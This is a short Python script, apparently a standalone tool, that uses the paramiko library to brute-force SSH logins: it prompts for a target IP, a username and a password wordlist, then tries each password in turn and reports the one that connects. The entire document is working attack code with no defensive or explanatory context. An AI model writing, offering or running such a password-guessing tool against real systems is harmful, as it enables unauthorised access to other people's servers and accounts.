import paramiko

def run():
    host = input("Target IP: ")
    username = input("Username: ")
    wordlist = input("Path to password list: ")

    print("[*] Starting brute-force...")

    with open(wordlist, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password, timeout=3)
                print(f"[+] Success! Password found: {password}")
                ssh.close()
                break
            except:
                print(f"[-] Failed: {password}")